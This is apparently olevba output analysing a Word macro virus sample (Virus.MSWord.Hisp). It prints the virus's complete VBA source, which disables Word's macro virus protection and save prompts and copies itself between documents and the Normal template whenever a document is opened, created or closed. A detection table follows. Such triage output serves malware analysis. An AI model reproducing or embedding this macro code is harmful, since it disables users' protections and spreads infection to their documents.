olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hisp-fca58cc5262d31bcdd1f22e828afcfef94b23a74
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hisp-fca58cc5262d31bcdd1f22e828afcfef94b23a74 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<HISpeedFuck>
'Coded by Destroyer Inc° 15.03.2000
Private Sub Document_Close()
    On Error Resume Next
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    Set nt = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set ad = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If ad.Lines(1, 1) <> "'<HISpeedFuck>" Then
       ad.DeleteLines 1, ad.CountofLines
       ad.InsertLines 1, nt.Lines(1, nt.CountofLines)
    End If
    If nt.Lines(1, 1) <> "'<HISpeedFuck>" Then
        nt.DeleteLines 1, nt.CountofLines
        nt.InsertLines 1, ad.Lines(1, ad.CountofLines)
        NormalTemplate.Save
    End If
End Sub
Private Sub Document_New()
Document_Close
End Sub
Private Sub Document_Open()
Document_Close
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

